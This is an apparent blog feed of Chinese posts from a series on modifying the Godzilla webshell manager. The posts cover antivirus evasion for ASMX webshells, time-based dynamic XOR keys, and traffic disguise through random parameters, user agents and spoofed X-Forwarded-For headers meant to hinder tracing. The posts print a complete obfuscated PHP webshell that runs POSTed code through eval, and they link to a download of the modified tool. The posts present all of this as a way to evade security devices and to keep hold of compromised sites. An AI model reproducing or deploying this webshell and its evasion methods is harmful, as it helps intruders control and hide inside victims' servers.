alt="image-20250126180015692"></p><p>先来看一下啊</p><ul><li><p><strong><code>&quot;http://tempuri.org/pass&quot;</code> 的含义</strong></p><ul><li><p><strong><code>http://tempuri.org/</code></strong></p><ul><li><p>这是一个占位命名空间（temporary URI），表示临时的命名空间。它通常用于默认的 Web 服务项目，表示尚未定义特定的命名空间。</p></li><li><p>在生产环境中，应替换为特定的命名空间，如：<br><code>http://example.com/myservice</code> 或其他规范的 URI。</p></li></ul></li></ul></li></ul><p>这个是必须的，下面传递的参数呢就是xml格式的，右边是返回的数据，可以看到左右追加的md5 16位。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;11CD6A8758984163o8tM0853zU1IMnDChC5Kz8LDfyvxkgvjI4biZcqE8CaljtGledXoE+blv/pYFFNZ6C37AC826A2A04BC&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p>本来计划者做成下面这样的，就是将16字符串替换为<data></data>,这样伪装一下。但是没成功，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;&lt;data&gt;o8tM0853zU1IMnDChC5Kz8LDfyvxkgvjI4biZcqE8CaljtGledXoE+blv/pYFFNZ&lt;/data&gt;&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126181040305.png" alt="image-20250126181040305"></p><p>这里可以看到我们将data写好之后。<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126181158838.png" alt="image-20250126181158838"></p><p>可以清晰的看到就是，返回的&lt;&gt; 都被转义了。奈何笔者太菜了，查阅了很多资料，都没呀将尖括号就调整过来。不过这样看，也看不出来后面的=了。<code>&lt;soap:Body&gt;&lt;asdResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;asdResult&gt;&amp;lt;data&amp;gt;pKbveI07Gojru9gjm3HZ2nDxmEBZAUIUH0ifaEX3JQI=&amp;lt;data&amp;gt;&lt;/asdResult&gt;&lt;/asdResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></p><p>其实你看这个返回包，其中这个最后的=像base64，但是，当<data></data>,进行url实体编码后，也好看一点了。其实主要还是将原来的16位去除掉，简单混淆一下。</p><p>好，我们这里流量就先这样。奈何现在笔者这里没有安全设备，也没有办法去试试是否免杀，还希望大家在使用后，将效果告诉笔者，咱们在做改进。</p><h5 id="asmx免杀木马生成"><a href="#asmx免杀木马生成" class="headerlink" title="asmx免杀木马生成"></a>asmx免杀木马生成</h5><p>好，接下来将我们的免杀封装到godzilla中，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126183223375.png" alt="image-20250126183223375"></p><p>先做shell修改，简单修改一下</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126190855167.png" alt="image-20250126190855167"></p><p>shell模板也替换一下，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126190914539.png" alt="image-20250126190914539"></p><p>好，接下来，build project，build artifacts。</p><p>大家在使用的时候，asmx的木马在cshap中,<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192127888.png" alt="image-20250126192127888"></p><p>点击生成即可，还是推荐大家别用默认口令及密码。</p><p>生成三份</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192722085.png" alt="image-20250126192722085"></p><p>都不一样，没啥问题。看下能不能用。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126192759491.png" alt="image-20250126192759491"></p><p>大家使用的时候，选择<code>CShapDynamicPayload-&gt;CSHAP_ASMX_AES_BASE64_DATA</code>即可，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126193203603.png" alt="image-20250126193203603"></p><p>使用起来也是没啥问题。好，这里我们就差不多改完了。</p><p>上面提到推荐大家别用默认密钥及密码或者将密码密钥设为一样的。这里说一下为什么，就是我们访问木马的时候，其实是可以看到密码。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126194700390.png" alt="image-20250126194700390"></p><p>就是这个，参数，其实这里就是密码，但不是密钥（key）。如果别访问到了，去猜你的密钥，你设置很简单，或者和密码相同，那么你辛辛苦苦打的站就被别人上车了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>本文对godzilla中asmx木马进行免杀，及流量修改进行简单免杀，将免杀木马封装到godzilla中，使用模板进行免杀，达到每次生成的木马都不相同。</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装。</p><p>1.2版本做了动态密钥。</p><p>1.3版本做了左右动态添加数据，</p><p>1.4版本做了asmx动态免杀及流量修改。</p><p>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是message其实是固定的，希望能让他动起来。</p><h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            原版哥斯拉</span><br></pre></td></tr></table></figure><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> 二开 </tag>
            
            <tag> asmx免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哥斯拉二开从0到1-4(流量优化)</title>
      <link href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/"/>
      <url>/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>上面的文章做了动态的免杀，以及基于时间的密钥动态处理，还挺好的，还有没有什么东西可以做成动态的，我想了想，还可以把ua或者以前计划中实现的数据包左右追加给动态实现一下。</p><h5 id="数据追加"><a href="#数据追加" class="headerlink" title="数据追加"></a>数据追加</h5><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171238054.png" alt="image-20250122171238054"></p><p>默认我们打开哥斯拉是不左右追加数据的。前几个版本都左边加了page=1&amp;size=10右边追加了&amp;Name=manager，这次我们让他动起来。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171359220.png" alt="image-20250122171359220"></p><p>在core\ui\component\frame\ShellSetting.java下有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.leftTextArea.setText(<span class="string">&quot;page=1&amp;size=10&amp;&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.rightTextArea.setText(<span class="string">&quot;&amp;Name=manager&quot;</span>);</span><br></pre></td></tr></table></figure><p>都是用来设置的，那么我们可以设置一个变量让他动起来，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171548157.png" alt="image-20250122171548157"></p><p>简单定义了一个数组，包含常用的键值，然后就是值，我们采用随机生成一个两位数字，就会是大概cartid=12这样，接着，将所有的键值对给到一个列表，然后再随机抽选几个键值对。</p><p>看下效果。<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171927650.png" alt="image-20250122171927650"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171936053.png" alt="image-20250122171936053"></p><p>page=33&amp;quantity=51&amp;size=47&amp;orderid=21&amp;status=63&amp;productname=78&amp;</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122171959443.png" alt="image-20250122171959443"></p><p>page=47&amp;quantity=5&amp;size=84&amp;brand=67&amp;</p><p>size=17&amp;orderid=4&amp;</p><p>这样每次添加一个shell的时候就不会定死了，每次都是动态的。</p><p>同样的，给右边的列表也随机一下，看一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172138855.png" alt="image-20250122172138855"></p><p>&amp;networkstatus=90&amp;osversion=17&amp;orderdata=72</p><p>&amp;availability=11&amp;networkstatus=47&amp;cartid=51&amp;price=33&amp;orderdata=67</p><p>也是每次都不一定的。</p><p>看下实际效果</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172243935.png" alt="image-20250122172243935"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172317731.png" alt="image-20250122172317731"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172349529.png" alt="image-20250122172349529"></p><p>可以看到，每次都是随机的。</p><h5 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h5><p>好的，我们来看下ua，原本打算随便写一下ua，随机替换，但是想了想，还是不要这样，为什么呢，我们的流量主要是针对安全设备的，如果你的ua是那种非常随便的，或者很老的那种机器ua，应该不好。我们还是用平常使用的ua，我这里将我平常在edge，火狐、google、pc端和macos端的ua收集了一下，从这几个中ua中随机选一个使用，这样ua就是一个正常使用的ua了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172653987.png" alt="image-20250122172653987"></p><h5 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h5><p>Accept-Language：表示浏览器所支持的语言。</p><p>当我们在开发国际化的网站时，后端接口的信息需要根据用户所使用的语言返回对应的内容。作为后端我需要前端在请求头的Accept-Language属性声明需要返回的语言。</p><p>Accept-Language: zh-cn,zh;q=0.5<br>意思： 支持的语言分别是简体中文和中文，优先支持简体中文。<br>zh-cn:表示简体中文，zh:表示中文（包括简体中文，繁体中文）</p><p>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>意思：优先支持中文，如果没有中文则支持英文。<br>q:表示他之前语言的权重, 0 &lt;= q &lt;= 1</p><p>这里笔者选择了我浏览器访问网站中几个常用的Accept-Language进行随机选择。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122173343028.png" alt="image-20250122173343028"></p><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>然后呢，还加了一个</p><p><code>X-Forwarded-For: 127.0.0.1</code></p><p>这里笔者只加了一个X-Forwarded-For，在我们平常访问网站的时候，有很多网站都会识别X-Forwarded-For的值，如果碰巧在我们打战的时候，有网站识别xff,那我们就能迷惑管理员一下，溯源的时候吗，让他不好溯源。下面是一些常用的xff，大家自行选择使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Remote-Addr: 127.0.0.1</span><br><span class="line">X-Real-Ip: 127.0.0.1</span><br><span class="line">REMOTE-HOST: 127.0.0.1</span><br><span class="line">via:127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1 </span><br><span class="line"></span><br><span class="line"> var list_of_fake_ip_headers = [&quot;X-Forwarded-For&quot;,&quot;X-Forwarded&quot;,&quot;Forwarded-For&quot;,&quot;Forwarded&quot;,&quot;X-Forwarded-Host&quot;,&quot;X-remote-IP&quot;,&quot;X-remote-addr&quot;,&quot;True-Client-IP&quot;,&quot;X-Client-IP&quot;,&quot;Client-IP&quot;,&quot;X-Real-IP&quot;,&quot;Ali-CDN-Real-IP&quot;,&quot;Cdn-Src-Ip&quot;,&quot;Cdn-Real-Ip&quot;,&quot;CF-Connecting-IP&quot;,&quot;X-Cluster-Client-IP&quot;,&quot;WL-Proxy-Client-IP&quot;,&quot;Proxy-Client-IP&quot;,&quot;Fastly-Client-Ip&quot;,&quot;True-Client-Ip&quot;];</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>本文对左右追加数据进行简单修改，每次添加shell的时候，随机添加一些左右数据，来增加混淆。对header进行优化，随机ua，随机Accept-Language，和加了xff头，迷惑一些检测xff的设备。</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装。1.2版本做了动态密钥。<br>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是message其实是固定的，希望能让他动起来。</p><h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            原版哥斯拉</span><br></pre></td></tr></table></figure><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> 二开 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哥斯拉二开从0到1-3(动态密钥)</title>
      <link href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/"/>
      <url>/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>有小伙伴说，上面的文章都做了动态的免杀，每次生成的木马都不一样，还挺好的，还有没有什么东西可以做成动态的，我想了想，如果把我们的密钥做成动态的，那岂不是，简单的实现了动态加密。</p><h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><p>首先我们来看，哥斯拉的加密传输过程</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20241224145346679.png" alt="image-20241224145346679"></p><p>这里我们可以看到，有两个关键点，就是  pass和key</p><p>pass就是传递的键，payload为值，payload是由key控制的，因为你每次需要发送的东西  都会进行异或一下。如果这里，我们把key设成动态的，那么也就是说，payload就会是动态的。当然，这不是重点，重点是，如果对方的安全设备上，捕获了我们的流量，他想解密我们在其中做了什么，那么就需要key解密，看图中的第八步，执行的结果需要xor才能获取值。好，如果我们的木马文件中，没有写key，或者把key写成动态的，如果他不知道key是什么，那么他就解不出来了我们做了什么了。当然，key是可以爆破的，就是比较麻烦了。</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>这里我们也可以想到，因为我们必须要传上去一个木马，木马中必定带key和pass，并且本地也需要知道这个key，去和服务端通信。如果客户端发送一个key  再在木马中使用，那么流量中就会暴漏key了。那么，目前来看最好的协商密钥就是时间，我们的哥斯拉肯定是运行在本地的，那么时间肯定是准的，假设，服务器时间也是准的，那么，我们每次执行都需要key，那么也就是说key在变化，我们的payload也在变化。如果运维人员需要解密，那么，将需要更多的时间。</p><p>我们在假设一个场景，理想化一点当然如果服务器的时间和本地时间是准的，而安全设备的时间和服务器的时间不同步，那么他可能就解不出来我们的流量了，也就是不知道我们具体做了什么了。思路有了，下面来具体实现。</p><h5 id="php-实现动态密钥"><a href="#php-实现动态密钥" class="headerlink" title="php 实现动态密钥"></a>php 实现动态密钥</h5><p>直接在我们免杀的基础上改一下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?pHP</span></span><br><span class="line">ini_set(<span class="string">&#x27;error_reporting&#x27;</span>,chr(<span class="number">48</span>));</span><br><span class="line">header(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">call_user_func(nsfocus(<span class="string">&quot;c2V0X3RpbWVfbGltaXQ=&quot;</span>), <span class="number">48</span>);</span><br><span class="line"><span class="variable">$asiainfosec</span> = Chr(<span class="number">98</span>).Chr(<span class="number">97</span>).Chr(<span class="number">115</span>).Chr(<span class="number">101</span>).Chr(<span class="number">54</span>).Chr(<span class="number">52</span>).Chr(<span class="number">95</span>);</span><br><span class="line"><span class="variable">$huawei</span> = <span class="string">&quot;\x63\x6f\x64\x65&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hillstonenet</span>(<span class="params"><span class="comment">/*antiy*/</span><span class="variable">$chaitin</span>,<span class="variable">$topsec</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$damddos</span>=Chr(<span class="string">&quot;48&quot;</span>);<span class="variable">$damddos</span>&lt;strlen(<span class="variable">$chaitin</span>);<span class="variable">$damddos</span>++) &#123;</span><br><span class="line">        <span class="variable">$dbappsecurity</span> = <span class="variable">$topsec</span>[<span class="variable">$damddos</span>+Chr(<span class="string">&quot;49&quot;</span>)&amp;chr(<span class="number">49</span>).chr(<span class="number">53</span>)];</span><br><span class="line">        <span class="variable">$chaitin</span>[<span class="variable">$damddos</span>] = <span class="variable">$chaitin</span>[<span class="variable">$damddos</span>]^<span class="variable">$dbappsecurity</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$chaitin</span>;</span><br><span class="line">&#125;<span class="variable">$sangfor</span>=nsfocus(<span class="string">&quot;cGFzcw==&quot;</span>);<span class="variable">$threatbook</span> = nsfocus(<span class="string">&quot;WVhsc2IyRms=&quot;</span>);</span><br><span class="line"><span class="variable">$qianxin</span> = <span class="variable">$asiainfosec</span>.Chr(<span class="number">101</span>).Chr(<span class="number">110</span>).<span class="variable">$huawei</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nsfocus</span>(<span class="params"><span class="variable">$strshiwu</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$asiainfosec</span>,<span class="variable">$huawei</span>;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$asiainfosec</span>.Chr(<span class="number">100</span>).Chr(<span class="number">101</span>).<span class="variable">$huawei</span>;</span><br><span class="line">    <span class="keyword">return</span> call_user_func(<span class="variable">$func</span>, <span class="variable">$strshiwu</span>);</span><br><span class="line">&#125;<span class="variable">$qingteng</span>=nsfocus(<span class="string">&quot;M2M2ZTBiOGE5YzE1MjI0YQ==&quot;</span>);</span><br><span class="line"><span class="variable">$venustech</span> = nsfocus(<span class="string">&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span><span class="comment">/*qingteng*/</span>[<span class="variable">$sangfor</span>])) &#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    <span class="variable">$alibaba</span>=hillstonenet<span class="comment">/*antiy*/</span>(nsfocus(<span class="variable">$_POST</span>[<span class="variable">$sangfor</span>]),<span class="variable">$qingteng</span>);<span class="keyword">if</span> (<span class="comment">/*antiy*/</span><span class="keyword">isset</span>(<span class="variable">$_SESSION</span><span class="comment">/*leadsec*/</span>[<span class="variable">$dptech</span>])) &#123;</span><br><span class="line"><span class="variable">$antiy</span>=hillstonenet(<span class="variable">$_SESSION</span><span class="comment">/*hillstonenet*/</span>[<span class="variable">$dptech</span>],<span class="variable">$qingteng</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="comment">/*antiy*/</span>strpos(<span class="variable">$antiy</span>,nsfocus<span class="comment">/*antiy*/</span>(<span class="variable">$venustech</span>))===<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$antiy</span>=hillstonenet<span class="comment">/*antiy*/</span>(<span class="variable">$antiy</span>,<span class="variable">$qingteng</span>);</span><br><span class="line">&#125;define(<span class="string">&quot;leadsec&quot;</span>,<span class="string">&quot;//alibaba\r\n&quot;</span>.<span class="variable">$antiy</span>);@<span class="keyword">eval</span>(leadsec);<span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>.<span class="variable">$qianxin</span>(hillstonenet(@run(<span class="variable">$alibaba</span>),<span class="variable">$qingteng</span>)).<span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">if</span> (strpos<span class="comment">/*nsfocus*/</span>(<span class="variable">$alibaba</span>,nsfocus(<span class="variable">$venustech</span>))!==<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$dptech</span>]=hillstonenet(<span class="variable">$alibaba</span>,<span class="variable">$qingteng</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$qingteng=nsfocus(“M2M2ZTBiOGE5YzE1MjI0YQ==”);  为key的base64,</p><p>先看下时间</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106110658577.png" alt="image-20250106110658577"></p><p>php很简单就能获取到，在取该时间的md5的前16位</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106110937329.png" alt="image-20250106110937329"></p><p>可以看到也可以取到，那么，给到我们定义的key即可。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111038800.png" alt="image-20250106111038800"></p><p>也就是这样。</p><p>好，木马做好之后，就是客户端了。我们修改一下客户端。</p><p>到连接的代码中改一下，和php的一样，要严格一样，不然md5不对，肯定是连不上的，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111257535.png" alt="image-20250106111257535"></p><p>先获取时间，在md5 在取前十六位，在复制给key就可以了。</p><p>看下木马的key，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111506618.png" alt="image-20250106111506618"></p><p>简单随机，不固定</p><p>打包编译即可。</p><p>来测试一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111624123.png" alt="image-20250106111624123"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111737530.png" alt="image-20250106111737530"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111750915.png" alt="image-20250106111750915"></p><p>功能都没有问题。</p><p>好，现在来说一下缺点，没说之前，我们还是要仔细的来了解一下哥斯拉的传递参数原理。</p><p>在</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106112822066.png" alt="image-20250106112822066"></p><p>这个界面，我们点击测试的时候，哥斯拉会传递一个大包，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106112904595.png" alt="image-20250106112904595"></p><p>也就是这个，他会很大，且发送包不携带cookie。服务器端会生成一个PHPSESSID的值，来存储请求的大包，这个请求的大包是什么呢，我们可以解出来看一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106144059303.png" alt="image-20250106144059303"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 